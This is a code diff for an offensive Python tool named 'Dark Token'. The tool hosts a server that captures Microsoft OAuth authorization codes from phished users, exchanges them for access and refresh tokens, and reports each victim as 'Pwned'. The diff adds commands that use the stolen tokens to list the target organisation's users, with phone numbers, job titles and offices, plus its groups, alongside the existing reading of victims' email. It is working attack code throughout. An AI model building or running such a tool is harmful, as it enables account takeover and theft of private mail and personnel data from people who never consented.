@@ -41,11 +41,17 @@ import os
 from os import system
 
 SIGNAL = ''
+global EMAILDOMAIN
 global TOKENS
 global HTTPD
-API_BASE = 'https://graph.microsoft.com/'
-API_PROFILE = 'v1.0/me'
-API_MESSAGE = 'v1.0/me/messages'
+API = {
+	'base': 'https://graph.microsoft.com/',
+	'profile': 'v1.0/me',
+	'message': 'v1.0/me/messages',
+	'users': 'v1.0/users',
+	'groups': 'v1.0/groups',
+	'mygroups': "v1.0/me/memberOf/$/microsoft.graph.group?$filter=groupTypes/any(a:a%20eq%20'unified')"
+}
 global CLIENT_IP
 APP_CONFIG = {
 	'client_id': '',
@@ -54,8 +60,8 @@ APP_CONFIG = {
 	'redirect_uri': ''
 	}
 CERT_CONFIG = {
-	'keyfile': '',
-	'certfile': ''
+	'keyfile': 'key.pem',
+	'certfile': 'cert.pem'
 }
 
 help = """
@@ -66,6 +72,9 @@ start server         - To start Dark Token server.
 stop server          - To stop Dark Token server.
 list tokens          - To list all tokens.
 list message ID      - To list email messages from a specific account.
+list users ID        - To list users of the target organization.
+list groups ID       - To list groups of the target organization.
+list my groups ID    - To list assigned groups of the current account.
 clear                - To clear screen.
 
 [App Configuration]
@@ -75,6 +84,8 @@ set client_id        - To set client_id      - REQUIRED
 set scope            - To set scope
 set client_secret    - To set client_secret  - REQUIRED
 set redirect_uri     - To set redirect_uri   - REQUIRED
+set keyfile          - To set private key file
+set certfile         - To set certificate file
 generate link        - Generate permission request link
 
 """
@@ -99,7 +110,10 @@ class AuthorizationHandler(BaseHTTPRequestHandler):
 				get_access_token(auth_code)
 				# Redirect target for operation safe.
 				self.send_response(307) # StatusTemporaryRedirect
-				self.send_header('Location','https://outlook.live.com/')
+				if EMAILDOMAIN.__contains__('@outlook.com'):
+					self.send_header('Location','https://outlook.live.com/')
+				else:
+					self.send_header('Location','https://outlook.office365.com/')
 				self.end_headers()
 	def log_message(self, format, *args):
 		return
@@ -144,19 +158,39 @@ def get_access_token(code):
 	store_token(account, res_json['access_token'], res_json['id_token'], res_json['refresh_token'])
 
 def get_account_profile(access_token):
-	resp = httpRequest(API_BASE+API_PROFILE, '', access_token, 'GET')
+	global EMAILDOMAIN
+	resp = httpRequest(API['base']+API['profile'], '', access_token, 'GET')
 	resp_body = resp.read()
 	res_json = json.loads(resp_body.decode('utf-8'))
+	EMAILDOMAIN = res_json['userPrincipalName']
 
 	print colors.green + '[*] Pwned: Got Access Token for ' + res_json['userPrincipalName'] + ' - ' + CLIENT_IP + colors.end
 	return res_json
 
 def get_account_messages(access_token):
-	resp = httpRequest(API_BASE+API_MESSAGE, '', access_token, 'GET')
+	resp = httpRequest(API['base']+API['message'], '', access_token, 'GET')
 	resp_body = resp.read()
 	res_json = json.loads(resp_body.decode('utf-8'))
 	return res_json
 
+def get_users(access_token):
+	resp = httpRequest(API['base']+API['users'], '', access_token, 'GET')
+	resp_body = resp.read()
+	res_json = json.loads(resp_body.decode('utf-8'))
+	return res_json
+
+def get_groups(access_token):
+	resp = httpRequest(API['base']+API['groups'], '', access_token, 'GET')
+	resp_body = resp.read()
+	res_json = json.loads(resp_body.decode('utf-8'))
+	return res_json
+
+def get_mygroups(access_token):
+	resp = httpRequest(API['base']+API['mygroups'], '', access_token, 'GET')
+	resp_body = resp.read()
+	res_json = json.loads(resp_body.decode('utf-8'))
+	return res_json
+	
 def start_server():
 	global HTTPD
 	if not APP_CONFIG['client_id'] or not APP_CONFIG['client_secret'] or not APP_CONFIG['redirect_uri']:
@@ -165,7 +199,7 @@ def start_server():
 		try:
 			HTTPD = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), AuthorizationHandler)
 			print '[!] Starting Dark Token Server...'
-			HTTPD.socket = ssl.wrap_socket (HTTPD.socket, keyfile='key.pem', certfile='cert.pem', server_side=True)
+			HTTPD.socket = ssl.wrap_socket (HTTPD.socket, keyfile=CERT_CONFIG['keyfile'], certfile=CERT_CONFIG['certfile'], server_side=True)
 			HTTPD.serve_forever()
 		except:
 			print '[!] Server is already started.'
@@ -200,15 +234,48 @@ while True:
 		except NameError:
 			print '[!] 0 tokens found in the database.'
 			pass
+	elif SIGNAL.__contains__('list users'):
+		id = SIGNAL.split()[2]
+		try:
+			users = get_users(TOKENS[int(id)][1])
+			for i in range(len(users['value'])):
+				print colors.allwhite + '-' * int(columns) + colors.end
+				print colors.white + 'Display Name: ' + str(users['value'][i]['displayName']) + colors.end
+				print colors.white + 'User Principal Name: ' + str(users['value'][i]['userPrincipalName']) + colors.end
+				print colors.white + 'Business Phone: ' + str(users['value'][i]['businessPhones']) + colors.end
+				print colors.white + 'Job Title: ' + str(users['value'][i]['jobTitle']) + colors.end
+				print colors.white + 'Mail: ' + str(users['value'][i]['mail']) + colors.end
+				print colors.white + 'Mobile Phone: ' + str(users['value'][i]['mobilePhone']) + colors.end
+				print colors.white + 'Office Location: ' + str(users['value'][i]['officeLocation']) + colors.end
+		except:
+			print '[!] 0 users found in the database.'
+	elif SIGNAL.__contains__('list groups'):
+		id = SIGNAL.split()[2]
+		try:
+			groups = get_groups(TOKENS[int(id)][1])
+			for i in range(len(groups['value'])):
+				print colors.allwhite + '-' * int(columns) + colors.end
+				print color.white + str(groups['value'][i])
+		except:
+			print '[!] 0 groups found in the database.' 
+	elif SIGNAL.__contains__('list my groups'):
+		id = SIGNAL.split()[3]
+		try:
+			groups = get_mygroups(TOKENS[int(id)][1])
+			for i in range(len(groups['value'])):
+				print colors.allwhite + '-' * int(columns) + colors.end
+				print color.white + str(groups['value'][i])
+		except:
+			print '[!] 0 groups found in the database.'
 	elif SIGNAL.__contains__('list message'):
 		id = SIGNAL.split()[2]
 		try:
 			msg = get_account_messages(TOKENS[int(id)][1])
 			for i in range(len(msg['value'])):
 				print colors.allwhite + '-' * int(columns) + colors.end
-				print colors.blue + 'Subject: ' + msg['value'][i]['subject']
-				print colors.blue + 'Body:'
-				print colors.white + msg['value'][i]['bodyPreview']
+				print colors.blue + 'Subject: ' + msg['value'][i]['subject'] + colors.end
+				print colors.blue + 'Body:' + colors.end
+				print colors.white + msg['value'][i]['bodyPreview'] + colors.end
 		except NameError:
 			print '[!] 0 messages found in the database.'
 			pass
